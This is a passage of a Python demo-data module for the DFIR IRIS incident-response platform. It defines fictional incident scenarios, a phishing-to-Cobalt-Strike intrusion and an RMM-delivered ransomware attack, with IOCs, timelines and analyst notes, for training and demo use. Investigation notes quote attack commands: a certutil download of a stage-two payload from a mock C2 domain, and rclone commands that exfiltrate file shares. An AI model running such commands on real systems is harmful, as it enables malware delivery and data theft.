#  IRIS Source Code
#  DFIR IRIS
#  contact@dfir-iris.org
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU Lesser General Public
#  License as published by the Free Software Foundation; either
#  version 3 of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
#  Lesser General Public License for more details.
#
#  You should have received a copy of the GNU Lesser General Public License
#  along with this program; if not, write to the Free Software Foundation,
#  Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

"""Incident datasets used to fill demo cases.

Pure data — this module imports nothing from `app` so it can be read,
linted and unit-tested without a database or an application context.
`app.iris_engine.demo_populate` is what turns these dicts into rows.

Every demo case is stamped from one of `SCENARIOS`, picked round-robin
by case index, so a demo instance looks like a SOC with a mixed
caseload rather than thirty copies of the same incident.

Scenario keys
-------------
``key``             stable slug, used to build idempotency references
``title``           short incident name, becomes part of the case name
``classification``  `CaseClassification.name` (MISP taxonomy, e.g. ``fraud:phishing``)
``severity``        `Severity.severity_name` — Low / Medium / High / Critical
``state``           `CaseState.state_name` — Open / Containment / ... / Closed
``tags``            comma-separated string handed to `save_case_tags`
``description``     markdown; renders on the case Summary tab
``assets``          ``(name, asset_type_name, ip, domain, compromised)``
``iocs``            ``(ioc_type_name, value, description)``
``notes``           ``(folder_name, [(note_title, markdown), ...])``
``timeline``        ``(minutes, title, content, source, color, category,
                      in_graph, in_summary, [asset_names], [ioc_values])``
                    ``minutes`` is an offset from the case anchor time;
                    ``category`` is an `EventCategory.name`.
``tasks``           ``(title, description, task_status_name, tags)``
``evidence``        ``(filename, evidence_type_name, description, size_bytes, sha256)``
``alerts``          ``(title, source, severity, status, resolution_status,
                      minutes, [asset_names], [ioc_values])``
                    ``resolution_status`` may be None; ``status`` of
                    ``Escalated`` links the alert to the case.
``war_room``        ``(name, state, severity, description)``
``chat``            ``[(author_slot, body), ...]`` seeded war-room messages.
                    ``author_slot`` indexes into the rotating cast of demo
                    users, so rooms show a multi-person conversation.
``comments``        ``(kind, target, text)`` with kind in
                    ``asset`` / ``ioc`` / ``task``; ``target`` is the asset
                    name, IOC value or task title.

Asset type names must exist in `AssetsType`, IOC type names in `IocType`,
and evidence type names in `EvidenceTypes` — the populate layer skips any
row whose reference data is missing rather than failing the boot.
"""

_PHISHING_C2 = {
    'key': 'phishing-c2',
    'title': 'Spear-phishing to Cobalt Strike implant',
    'classification': 'fraud:phishing',
    'severity': 'High',
    'state': 'Containment',
    'tags': 'phishing,cobalt-strike,credential-access,exfiltration,demo',
    'description': """## Executive summary

A targeted spear-phishing email delivered a macro-enabled spreadsheet to a
Finance user. The user enabled content, which launched a PowerShell download
cradle that staged a Cobalt Strike implant. The operator harvested credentials
from LSASS, moved laterally to the domain controller over SMB, and staged
roughly 48 MB of file-share data for exfiltration before the host was isolated.

**Status:** contained — eradication pending credential reset.

## Impact

| Area | Assessment |
|---|---|
| Confidentiality | **Confirmed loss** — ~48 MB exfiltrated to 203.0.113.88 |
| Integrity | No evidence of modification |
| Availability | Not affected |
| Accounts | `jdoe`, `svc_backup` presumed compromised |

## Attack path

1. **Initial access** — spear-phishing attachment (`invoice_Q4_2024.xlsm`)
2. **Execution** — Excel macro spawns an encoded PowerShell cradle
3. **Persistence** — `Run` key + scheduled task pointing at `svchost32.exe`
4. **Credential access** — LSASS handle opened with `PROCESS_VM_READ`
5. **Lateral movement** — NTLMv2 pass-the-hash to `SRV-DC-01`
6. **Collection / exfiltration** — mass reads from `SRV-FILE-02`, HTTPS POST out

## Outstanding actions

- [ ] Reset credentials for `jdoe` and `svc_backup`
- [ ] Review 30 days of `svc_backup` logons
- [ ] Sweep the CORP subnet for the `svchost32.exe` IOC
""",
    'assets': [
        ('WS-FINANCE-01', 'Windows - Computer', '10.0.1.10', 'CORP', True),
        ('WS-HR-07', 'Windows - Computer', '10.0.1.17', 'CORP', False),
        ('SRV-DC-01', 'Windows - DC', '10.0.0.1', 'CORP', False),
        ('SRV-FILE-02', 'Windows - Server', '10.0.0.12', 'CORP', False),
        ('LAPTOP-EXEC-02', 'Windows - Computer', '10.0.1.55', 'CORP', False),
        ('GW-FIREWALL', 'Firewall', '192.168.1.1', '', False),
        ('VPN-GATEWAY', 'VPN', '203.0.113.10', '', False),
        ('jdoe', 'Windows Account - AD', '', 'CORP', True),
        ('svc_backup', 'Windows Account - AD - Service', '', 'CORP', True),
        ('Administrator', 'Windows Account - Local - Admin', '10.0.0.1', 'CORP', False),
    ],
    'iocs': [
        ('domain', 'update-service-cdn.net', 'C2 domain used for beacon callbacks'),
        ('domain', 'telemetry-patch-ms.com', 'Lookalike domain mimicking Microsoft telemetry'),
        ('ip-dst', '198.51.100.47', 'C2 IP observed in threat intel feed'),
        ('ip-dst', '203.0.113.88', 'Exfiltration destination'),
        ('url', 'http://update-service-cdn.net/stage2.bin', 'Stage 2 payload download URL'),
        ('md5', 'd41d8cd98f00b204e9800998ecf8427e', 'Dropped malicious DLL'),
        ('sha256', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
         'Obfuscated PowerShell dropper'),
        ('email-src', 'invoice-update@mail-noreply-corp.net', 'Phishing sender address'),
        ('filename', 'invoice_Q4_2024.xlsm', 'Macro-enabled document used for initial access'),
        ('filename', 'svchost32.exe', 'Masqueraded implant dropped in Temp'),
        ('regkey', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater',
         'Persistence registry key'),
        ('user-agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
         'Implant HTTP user-agent'),
    ],
    'notes': [
        ('Initial Analysis', [
            ('Triage Summary',
             '## Triage Summary\n\n**Analyst:** Initial responder\n\n'
             'Alert triaged and confirmed as a true positive. A malicious macro document '
             'was delivered by spear-phishing. The user opened the attachment and enabled '
             'macros, triggering a PowerShell cradle that downloaded a second-stage payload.\n\n'
             '**Priority:** High  \n**Containment required:** Yes'),
            ('Affected Systems',
             '## Affected Systems\n\n| Hostname | IP | Domain | Status |\n'
             '|---|---|---|---|\n'
             '| WS-FINANCE-01 | 10.0.1.10 | CORP | Isolated |\n'
             '| SRV-FILE-02 | 10.0.0.12 | CORP | Monitoring |\n'
             '| SRV-DC-01 | 10.0.0.1 | CORP | Monitoring |\n\n'
             'The domain controller was reached by lateral movement. Event logs reviewed — '
             'no evidence of persistence on the DC at this time.'),
        ]),
        ('Investigation', [
            ('Execution Chain',
             '## Execution Chain\n\n```\nOUTLOOK.EXE\n'
             '  └─ EXCEL.EXE (invoice_Q4_2024.xlsm)\n'
             '       └─ powershell.exe -enc <base64>\n'
             '            └─ cmd.exe /c certutil -urlcache -f '
             'http://update-service-cdn.net/stage2.bin C:\\Users\\Public\\svchost32.exe\n'
             '                 └─ svchost32.exe (implant)\n```\n\n'
             'The implant established a scheduled task under the current user context.'),
            ('Network Activity',
             '## Network Activity\n\n'
             'Beacon pattern observed every ~240 seconds to **198.51.100.47:443**. '
             'The JA3 fingerprint matches a known Cobalt Strike profile.\n\n'
             'DNS queries to `update-service-cdn.net` begin at T+00:03, immediately after '
             'the document was opened.\n\n'
             'A single large outbound HTTPS transfer (~48 MB) to 203.0.113.88 at T+02:14 is '
             'consistent with staged archive upload.'),
            ('Credential Access',
             '## Credential Access\n\nLSASS memory read detected on WS-FINANCE-01 at T+00:47. '
             'Credential material was likely harvested for the `jdoe` and `svc_backup` accounts.\n\n'
             'A pass-the-hash attempt was observed from WS-FINANCE-01 against SRV-DC-01 '
             '(event ID 4624, logon type 3, NTLMv2).\n\n'
             '> Recommend immediate password reset for both accounts.'),
        ]),
        ('Remediation', [
            ('Containment Steps',
             '## Containment Steps\n\n- [x] Isolated WS-FINANCE-01 from the network\n'
             '- [x] Blocked 198.51.100.47 and 203.0.113.88 at the perimeter firewall\n'
             '- [x] Sinkholed `update-service-cdn.net` at internal DNS\n'
             '- [ ] Reset credentials for `jdoe` and `svc_backup`\n'
             '- [ ] Review all logon events for `svc_backup` in the last 30 days\n'
             '- [ ] Sweep all CORP hosts for the `svchost32.exe` IOC'),
            ('Lessons Learned',
             '## Lessons Learned\n\n'
             '1. Macro execution was permitted despite policy — review GPO enforcement.\n'
             '2. The EDR alert fired 4 minutes after execution — validate tuning and escalation SLA.\n'
             '3. The phishing domain was registered 6 hours before delivery and was not blocked '
             'at the mail gateway — consider newly-registered-domain scoring.\n'
             '4. Consider deploying decoy credentials to detect credential theft earlier.'),
        ]),
    ],
    'timeline': [
        (0, 'Phishing email received by jdoe',
         "Email with subject 'Invoice Q4 2024' received from invoice-update@mail-noreply-corp.net "
         'with attachment invoice_Q4_2024.xlsm.',
         'Email Gateway', '#FFD700', 'Initial Access', False, True,
         [], ['invoice-update@mail-noreply-corp.net', 'invoice_Q4_2024.xlsm']),
        (3, 'Malicious document opened',
         "User jdoe opened invoice_Q4_2024.xlsm in Excel and clicked 'Enable Content'. "
         'Macros executed immediately.',
         'EDR', '#FF8C00', 'Initial Access', False, True,
         ['WS-FINANCE-01', 'jdoe'], ['invoice_Q4_2024.xlsm']),
        (4, 'PowerShell cradle launched',
         'EXCEL.EXE spawned powershell.exe with a base64-encoded command that decoded to a '
         'certutil download of stage2.bin.',
         'EDR', '#FF4500', 'Execution', True, True,
         ['WS-FINANCE-01', 'jdoe'], ['svchost32.exe']),
        (5, 'Stage 2 payload downloaded',
         'certutil.exe downloaded http://update-service-cdn.net/stage2.bin to '
         'C:\\Users\\Public\\svchost32.exe.',
         'Proxy', '#FF4500', 'Execution', True, True,
         ['WS-FINANCE-01'],
         ['http://update-service-cdn.net/stage2.bin', 'update-service-cdn.net', 'svchost32.exe']),
        (6, 'Implant executed',
         'svchost32.exe spawned from cmd.exe and established an outbound TLS connection.',
         'EDR', '#FF0000', 'Execution', True, True,
         ['WS-FINANCE-01'], ['svchost32.exe']),
        (7, 'C2 beacon established',
         'First beacon to 198.51.100.47:443 observed. JA3 fingerprint matches a known '
         'Cobalt Strike profile.',
         'IDS/IPS', '#FF0000', 'Command and Control', True, True,
         ['WS-FINANCE-01', 'VPN-GATEWAY'], ['198.51.100.47', 'update-service-cdn.net']),
        (10, 'Scheduled task created for persistence',
         r"Scheduled task 'updater' created alongside an HKCU Run key pointing at svchost32.exe.",
         'EDR', '#FF4500', 'Persistence', True, False,
         ['WS-FINANCE-01'],
         [r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater']),
        (47, 'LSASS memory access',
         'svchost32.exe opened a handle to lsass.exe with PROCESS_VM_READ. Credential '
         'harvesting is likely at this point.',
         'EDR', '#FF0000', 'Credential Access', True, True,
         ['WS-FINANCE-01', 'jdoe'], []),
        (51, 'Lateral movement attempt to SRV-DC-01',
         'SMB connection from WS-FINANCE-01 to SRV-DC-01 using an NTLMv2 hash. '
         'Logon type 3 — network logon, event ID 4624.',
         'SIEM', '#FF4500', 'Lateral Movement', True, True,
         ['WS-FINANCE-01', 'SRV-DC-01', 'jdoe'], []),
        (134, 'Data exfiltration',
         '~48 MB HTTPS POST to 203.0.113.88, consistent with a staged archive upload. '
         'File activity prior to the transfer shows mass reads from the SRV-FILE-02 share.',
         'Firewall', '#FF0000', 'Exfiltration', True, True,
         ['WS-FINANCE-01', 'SRV-FILE-02'], ['203.0.113.88']),
        (178, 'Alert triaged by SOC',
         'EDR alert reviewed by the on-call analyst and escalated to the IR team.',
         'SIEM', '#1E90FF', 'Unspecified', False, False,
         [], []),
        (190, 'Host WS-FINANCE-01 isolated',
         'Network isolation applied via the EDR console. Host confirmed offline.',
         'EDR', '#32CD32', 'Remediation', False, True,
         ['WS-FINANCE-01'], []),
    ],
    'tasks': [
        ('Isolate WS-FINANCE-01',
         'Apply EDR network isolation and confirm the host is offline.', 'Done', 'containment'),
        ('Block C2 infrastructure at the perimeter',
         'Block 198.51.100.47 and 203.0.113.88 on the edge firewall; sinkhole '
         'update-service-cdn.net at internal DNS.', 'Done', 'containment'),
        ('Reset credentials for jdoe and svc_backup',
         'Force password reset and revoke active Kerberos tickets for both accounts.',
         'In progress', 'eradication'),
        ('Sweep CORP subnet for svchost32.exe',
         'Run an EDR IOC sweep across all CORP hosts for the implant hash and filename.',
         'In progress', 'hunting'),
        ('Quantify exfiltrated data',
         'Correlate SRV-FILE-02 access logs with the 48 MB outbound transfer to determine '
         'exactly which files left the environment.', 'To do', 'impact'),
        ('Draft incident report',
         'Produce the customer-facing incident report once eradication completes.',
         'To do', 'reporting'),
    ],
    'evidence': [
        ('WS-FINANCE-01-memory.raw', 'Memory image - Windows',
         'Full memory capture of WS-FINANCE-01 taken before isolation.',
         17179869184, 'a3f5c1d29b8e47f6a0c3d8e1b4f7a2c9d6e3b0f8a5c2d9e6b3f0a7c4d1e8b5f2'),
        ('WS-FINANCE-01-triage.zip', 'Triage collection - Windows',
         'KAPE triage collection: event logs, prefetch, registry hives, scheduled tasks.',
         524288000, 'b7e2d4a19c6f83b5e0a2c7d4f1b8e5a2c9d6f3b0e7a4c1d8f5b2e9a6c3d0f7b4'),
        ('proxy-logs-2024-11-14.csv', 'Log file',
         'Proxy logs covering the incident window, filtered to WS-FINANCE-01.',
         8388608, 'c1d8f5b2e9a6c3d0f7b4e1a8c5d2f9b6e3a0c7d4f1b8e5a2c9d6f3b0e7a4c1d8'),
        ('invoice_Q4_2024.xlsm', 'Malware sample',
         'Original phishing attachment recovered from the mail gateway quarantine.',
         98304, 'd6e3b0f8a5c2d9e6b3f0a7c4d1e8b5f2a3f5c1d29b8e47f6a0c3d8e1b4f7a2c9'),
    ],
    'alerts': [
        ('Malicious macro document opened by user', 'EDR', 'High', 'Escalated', None,
         3, ['WS-FINANCE-01', 'jdoe'],
         ['invoice_Q4_2024.xlsm', 'invoice-update@mail-noreply-corp.net']),
        ('Suspicious PowerShell execution detected', 'SIEM', 'High', 'Escalated', None,
         4, ['WS-FINANCE-01'], ['svchost32.exe']),
        ('Outbound connection to known C2 IP range', 'IDS/IPS', 'Critical', 'Escalated', None,
         7, ['WS-FINANCE-01'], ['198.51.100.47', 'update-service-cdn.net']),
        ('Privilege escalation attempt via scheduled task', 'EDR', 'High', 'In progress', None,
         10, ['WS-FINANCE-01'],
         [r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\updater']),
        ('Credential dumping activity detected', 'EDR', 'Critical', 'Escalated', None,
         47, ['WS-FINANCE-01', 'jdoe', 'svc_backup'], []),
        ('Potential data exfiltration over HTTPS', 'Firewall', 'High', 'Escalated', None,
         134, ['WS-FINANCE-01', 'SRV-FILE-02'], ['203.0.113.88']),
        ('Anomalous DNS queries to uncommon TLD', 'SIEM', 'Low', 'New', None,
         -1440, [], ['update-service-cdn.net', 'telemetry-patch-ms.com']),
        ('Brute force attempt on VPN gateway', 'Firewall', 'Medium', 'Closed', 'False Positive',
         -4320, ['VPN-GATEWAY'], []),
    ],
    'war_room': ('Phishing to implant — active response', 'active', 'High',
                 'Coordination room for the spear-phishing intrusion on WS-FINANCE-01. '
                 'Containment is done; eradication is blocked on credential resets.'),
    'chat': [
        (0, 'Kicking off the room. WS-FINANCE-01 is isolated as of a few minutes ago — '
            'confirmed offline in the EDR console.'),
        (1, 'Confirmed. I have the memory image and a KAPE triage collection uploaded to '
            'Evidence. Starting on the LSASS access chain now.'),
        (2, 'Firewall blocks are live for 198.51.100.47 and 203.0.113.88. DNS sinkhole for '
            'update-service-cdn.net is propagating.'),
        (0, 'Good. Priority question for the customer: what was in the SRV-FILE-02 share that '
            'the operator touched before the 48 MB upload?'),
        (1, 'Working it. File access logs are pulled, correlating against the transfer window.'),
        (2, '@here reminder — do not reset jdoe until we have finished the memory analysis, '
            'we will lose the live ticket material.'),
        (0, 'Agreed. Credential reset stays blocked until the memory pass is signed off.'),
    ],
    'comments': [
        ('asset', 'WS-FINANCE-01',
         'Patient zero. Isolated at T+03:10. Memory image captured before isolation — '
         'see the Evidence tab.'),
        ('asset', 'svc_backup',
         'Service account. Rotating this one needs a change window — it is referenced by the '
         'nightly backup job on SRV-FILE-02.'),
        ('ioc', '198.51.100.47',
         'Confirmed against two commercial feeds. Beacon interval ~240s with a 10% jitter.'),
        ('ioc', 'invoice_Q4_2024.xlsm',
         'Recovered intact from mail gateway quarantine. Macro is lightly obfuscated; '
         'decoded cradle is in the Investigation notes.'),
        ('task', 'Reset credentials for jdoe and svc_backup',
         'Blocked pending completion of memory analysis — resetting now would destroy the '
         'live Kerberos ticket material we still need.'),
    ],
}

_RANSOMWARE = {
    'key': 'ransomware',
    'title': 'Ransomware deployment via compromised RMM',
    'classification': 'malicious-code:ransomware',
    'severity': 'Critical',
    'state': 'Eradication',
    'tags': 'ransomware,rmm-abuse,double-extortion,demo',
    'description': """## Executive summary

An attacker abused the managed-service provider's RMM agent to push a
ransomware payload to 42 endpoints and three file servers over a 90-minute
window. Approximately 2.1 TB of data was staged and uploaded to a
`mega.nz`-adjacent host before encryption began — a double-extortion pattern.

**Status:** eradication in progress. Restoration from offline backup is
underway for the two most critical file servers.

## Impact

| Area | Assessment |
|---|---|
| Confidentiality | **Confirmed loss** — ~2.1 TB staged and exfiltrated |
| Integrity | **42 endpoints + 3 servers encrypted** |
| Availability | **Major** — file services down ~14 hours |
| Accounts | RMM service principal compromised |

## Attack path

1. **Initial access** — stolen RMM console credentials, no MFA enforced
2. **Discovery** — enumeration of the managed endpoint inventory
3. **Defense evasion** — Defender disabled by GPO push from the RMM
4. **Collection / exfiltration** — 2.1 TB staged via `rclone` to cloud storage
5. **Impact** — `LockBit`-style payload deployed via the RMM script engine

## Outstanding actions

- [ ] Complete restoration of `SRV-FS-01` and `SRV-FS-02`
- [ ] Force credential rotation across the entire RMM tenant
- [ ] Confirm the RMM vendor has revoked the compromised API token
""",
    'assets': [
        ('SRV-RMM-01', 'Windows - Server', '10.20.0.5', 'MSP', True),
        ('SRV-FS-01', 'Windows - Server', '10.20.1.10', 'CORP', True),
        ('SRV-FS-02', 'Windows - Server', '10.20.1.11', 'CORP', True),
        ('SRV-BACKUP-01', 'Windows - Server', '10.20.1.30', 'CORP', False),
        ('WS-ACCT-14', 'Windows - Computer', '10.20.3.14', 'CORP', True),
        ('WS-ACCT-22', 'Windows - Computer', '10.20.3.22', 'CORP', True),
        ('SRV-DC-02', 'Windows - DC', '10.20.0.1', 'CORP', False),
        ('rmm_service', 'Windows Account - AD - Service', '', 'MSP', True),
        ('helpdesk_admin', 'Windows Account - AD', '', 'MSP', True),
    ],
    'iocs': [
        ('ip-dst', '192.0.2.144', 'Exfiltration staging host used by rclone'),
        ('ip-src', '198.51.100.203', 'Source IP of the unauthorised RMM console login'),
        ('domain', 'backup-sync-cloud.org', 'Attacker-controlled cloud storage front-end'),
        ('filename', 'rclone.exe', 'Legitimate binary abused for bulk exfiltration'),
        ('filename', 'lock_svc.exe', 'Ransomware payload deployed through the RMM'),
        ('filename', 'RESTORE-MY-FILES.txt', 'Ransom note dropped in every encrypted directory'),
        ('sha256', 'f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80',
         'Hash of lock_svc.exe'),
        ('md5', '9e107d9d372bb6826bd81d3542a419d6', 'Hash of the rclone configuration blob'),
        ('regkey', r'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware',
         'Defender disabled by GPO push'),
        ('email-src', 'billing@backup-sync-cloud.org', 'Address given in the ransom note'),
    ],
    'notes': [
        ('Initial Analysis', [
            ('Triage Summary',
             '## Triage Summary\n\n**Analyst:** IR lead\n\n'
             'Mass encryption reported at 02:14 local. Root cause traced to the MSP RMM '
             'console — an operator account without MFA was accessed from 198.51.100.203, '
             'an IP with no prior history for this tenant.\n\n'
             '**Priority:** Critical  \n**Customer notified:** Yes, 02:41 local'),
            ('Scope',
             '## Scope\n\n| Class | Count | Encrypted |\n|---|---|---|\n'
             '| Workstations | 214 | 42 |\n'
             '| File servers | 4 | 3 |\n'
             '| Domain controllers | 2 | 0 |\n'
             '| Backup servers | 1 | 0 |\n\n'
             'Offline backups on SRV-BACKUP-01 were **not** reachable from the RMM and are '
             'intact. This is the recovery path.'),
        ]),
        ('Investigation', [
            ('RMM Abuse Chain',
             '## RMM Abuse Chain\n\n'
             '1. Console login as `helpdesk_admin` from 198.51.100.203 at 22:07 — no MFA\n'
             '2. Endpoint inventory exported at 22:19\n'
             '3. GPO pushed at 23:02 disabling Defender real-time protection\n'
             '4. `rclone.exe` staged to `C:\\ProgramData\\Intel\\` on both file servers\n'
             '5. Bulk upload 23:40 → 01:52 (~2.1 TB to backup-sync-cloud.org)\n'
             '6. `lock_svc.exe` pushed to all inventoried endpoints at 02:11\n\n'
             'The entire chain used the RMM\'s own script engine, so the activity looked '
             'like sanctioned administration to the endpoint agents.'),
            ('Exfiltration Analysis',
             '## Exfiltration Analysis\n\n'
             'Netflow shows a sustained ~2.1 TB outbound transfer to 192.0.2.144 between '
             '23:40 and 01:52.\n\n'
             '```\nrclone copy \\\\SRV-FS-01\\Finance remote:fin --transfers 16\n'
             'rclone copy \\\\SRV-FS-02\\HR remote:hr --transfers 16\n```\n\n'
             'The rclone config blob was recovered from `C:\\ProgramData\\Intel\\rclone.conf` '
             'and identifies the remote endpoint. Shares in scope: **Finance**, **HR**, '
             '**Legal**.'),
        ]),
        ('Recovery', [
            ('Restoration Plan',
             '## Restoration Plan\n\n'
             '- [x] Isolate SRV-RMM-01 and revoke all RMM API tokens\n'
             '- [x] Verify SRV-BACKUP-01 integrity against offline media\n'
             '- [x] Rebuild SRV-FS-01 from bare metal\n'
             '- [ ] Restore SRV-FS-01 data from the 2024-11-13 offline set\n'
             '- [ ] Rebuild and restore SRV-FS-02\n'
             '- [ ] Re-image the 42 affected workstations\n\n'
             '**RPO achieved:** ~19 hours. **Target RTO:** 36 hours.'),
        ]),
    ],
    'timeline': [
        (0, 'Unauthorised RMM console login',
         'helpdesk_admin authenticated to the RMM console from 198.51.100.203. No MFA '
         'challenge was presented — the account predates the MFA rollout.',
         'Cloud Security', '#FFD700', 'Initial Access', True, True,
         ['SRV-RMM-01', 'helpdesk_admin'], ['198.51.100.203']),
        (12, 'Endpoint inventory exported',
         'Full managed-endpoint inventory exported from the RMM console — 214 workstations '
         'and 6 servers.',
         'Cloud Security', '#FF8C00', 'Discovery', True, True,
         ['SRV-RMM-01'], []),
        (55, 'Defender disabled via GPO push',
         'A GPO disabling Defender real-time protection was pushed to all inventoried '
         'endpoints through the RMM script engine.',
         'EDR', '#FF4500', 'Defense Evasion', True, True,
         ['SRV-FS-01', 'SRV-FS-02', 'WS-ACCT-14'],
         [r'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware']),
        (73, 'rclone staged on file servers',
         'rclone.exe and rclone.conf written to C:\\ProgramData\\Intel\\ on SRV-FS-01 and '
         'SRV-FS-02.',
         'EDR', '#FF4500', 'Collection', True, True,
         ['SRV-FS-01', 'SRV-FS-02'], ['rclone.exe', '9e107d9d372bb6826bd81d3542a419d6']),
        (93, 'Bulk exfiltration begins',
         'Sustained outbound transfer to 192.0.2.144 begins. Finance, HR and Legal shares '
         'are read in sequence.',
         'Firewall', '#FF0000', 'Exfiltration', True, True,
         ['SRV-FS-01', 'SRV-FS-02'], ['192.0.2.144', 'backup-sync-cloud.org']),
        (225, 'Exfiltration completes',
         'Transfer ends after approximately 2.1 TB. Connection torn down cleanly.',
         'Firewall', '#FF0000', 'Exfiltration', True, True,
         ['SRV-FS-01', 'SRV-FS-02'], ['192.0.2.144']),
        (244, 'Ransomware deployed',
         'lock_svc.exe pushed to all inventoried endpoints via the RMM script engine and '
         'executed with SYSTEM privileges.',
         'EDR', '#FF0000', 'Impact', True, True,
         ['SRV-FS-01', 'SRV-FS-02', 'WS-ACCT-14', 'WS-ACCT-22'],
         ['lock_svc.exe',
          'f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80']),
        (247, 'Encryption detected',
         'Mass file-modification alerts fire across 42 endpoints. RESTORE-MY-FILES.txt '
         'dropped in every affected directory.',
         'EDR', '#FF0000', 'Impact', True, True,
         ['SRV-FS-01', 'SRV-FS-02'], ['RESTORE-MY-FILES.txt', 'billing@backup-sync-cloud.org']),
        (261, 'RMM isolated and tokens revoked',
         'SRV-RMM-01 taken offline and every RMM API token revoked with the vendor.',
         'SIEM', '#32CD32', 'Remediation', False, True,
         ['SRV-RMM-01'], []),
        (288, 'Offline backup integrity confirmed',
         'SRV-BACKUP-01 verified against offline media. The 2024-11-13 set is clean and '
         'becomes the restoration source.',
         'SIEM', '#32CD32', 'Remediation', False, True,
         ['SRV-BACKUP-01'], []),
    ],
    'tasks': [
        ('Revoke all RMM API tokens',
         'Coordinate with the RMM vendor to revoke and reissue every tenant API token.',
         'Done', 'containment'),
        ('Verify offline backup integrity',
         'Validate the 2024-11-13 offline backup set against known-good hashes before '
         'using it as the restoration source.', 'Done', 'recovery'),
        ('Rebuild and restore SRV-FS-01',
         'Bare-metal rebuild followed by data restoration from the verified offline set.',
         'In progress', 'recovery'),
        ('Rebuild and restore SRV-FS-02',
         'Same procedure as SRV-FS-01. Blocked until FS-01 restoration completes.',
         'To do', 'recovery'),
        ('Re-image 42 affected workstations',
         'Wipe and re-image every encrypted endpoint. Coordinate with the customer for '
         'user-data expectations.', 'In progress', 'recovery'),
        ('Enforce MFA across the RMM tenant',
         'Root cause was an operator account exempt from MFA. Close the exemption and audit '
         'for others.', 'To do', 'hardening'),
        ('Assess notification obligations',
         'Finance, HR and Legal shares were exfiltrated. Determine regulatory notification '
         'requirements with counsel.', 'In progress', 'legal'),
    ],
    'evidence': [
        ('SRV-FS-01-disk.E01', 'HDD image - E01 - Windows',
         'Forensic image of SRV-FS-01 taken post-encryption, pre-rebuild.',
         2199023255552, '1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809'),
        ('rmm-console-audit.json', 'Log file',
         'Full RMM console audit log export covering the 72 hours around the intrusion.',
         41943040, '2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a'),
        ('rclone.conf', 'Configuration file',
         'Recovered rclone configuration identifying the attacker cloud remote.',
         2048, '3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b'),
        ('lock_svc.exe', 'Malware sample',
         'Ransomware payload recovered from SRV-FS-01 before rebuild.',
         786432, 'f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f80'),
        ('netflow-exfil-window.pcap', 'Network capture',
         'Netflow records covering the 23:40–01:52 exfiltration window.',
         1073741824, '4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c'),
    ],
    'alerts': [
        ('Impossible travel on RMM console account', 'Cloud Security', 'Medium', 'Escalated',
         None, 0, ['helpdesk_admin', 'SRV-RMM-01'], ['198.51.100.203']),
        ('Endpoint protection disabled by policy', 'EDR', 'High', 'Escalated', None,
         55, ['SRV-FS-01', 'SRV-FS-02'],
         [r'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware']),
        ('Large archive file created and transferred', 'Firewall', 'High', 'Escalated', None,
         93, ['SRV-FS-01', 'SRV-FS-02'], ['192.0.2.144', 'backup-sync-cloud.org']),
        ('Ransomware-like file encryption behavior', 'EDR', 'Critical', 'Escalated', None,
         247, ['SRV-FS-01', 'SRV-FS-02', 'WS-ACCT-14'], ['lock_svc.exe']),
        ('Mass file modification detected', 'EDR', 'Critical', 'Escalated', None,
         247, ['WS-ACCT-14', 'WS-ACCT-22'], ['RESTORE-MY-FILES.txt']),
        ('Living-off-the-land binary staged in ProgramData', 'EDR', 'Medium', 'Closed',
         'True Positive With Impact', 73, ['SRV-FS-01'], ['rclone.exe']),
        ('Unusual admin login outside business hours', 'SIEM', 'Low', 'Closed',
         'True Positive With Impact', -30, ['helpdesk_admin'], ['198.51.100.203']),
    ],
    'war_room': ('Ransomware — 42 endpoints encrypted', 'active', 'Critical',
                 'Crisis room for the RMM-delivered ransomware event. Restoration from '
                 'offline backup is the critical path.'),
    'chat': [
        (0, 'Room is live. Current state: RMM isolated, tokens revoked, 42 endpoints and '
            '3 file servers encrypted. Offline backups confirmed clean.'),
        (1, 'FS-01 bare-metal rebuild finished. Starting the data restore from the 11-13 set now.'),
        (2, 'Netflow confirms ~2.1 TB out to 192.0.2.144 between 23:40 and 01:52. Finance, HR '
            'and Legal shares were all read.'),
        (0, 'That makes this double extortion. Looping in counsel on notification obligations — '
            'do not communicate with the actor address in the ransom note.'),
        (1, 'Understood. Nobody contacts billing@backup-sync-cloud.org.'),
        (2, 'Root cause is confirmed: helpdesk_admin had an MFA exemption. Auditing the tenant '
            'for any other exempt accounts.'),
        (0, 'Please make that audit a formal task — it is the single most important hardening '
            'item coming out of this.'),
    ],
    'comments': [
        ('asset', 'SRV-RMM-01',
         'Pivot point for the whole incident. Isolated at 02:31; all API tokens revoked with '
         'the vendor at 02:44.'),
        ('asset', 'SRV-BACKUP-01',
         'Not reachable from the RMM, which is why it survived. This is the entire recovery path '
         '— treat as critical.'),
        ('ioc', '192.0.2.144',
         'Staging host. Still resolving at time of writing — worth a takedown request.'),
        ('ioc', 'rclone.exe',
         'Signed legitimate binary, so no AV detection. Detection has to be behavioural: '
         'rclone writing to ProgramData is never normal here.'),
        ('task', 'Enforce MFA across the RMM tenant',
         'This is the root cause. Recommend making it a hard blocker on the post-incident '
         'report sign-off.'),
    ],
}

_INSIDER_EXFIL = {
    'key': 'insider-exfil',
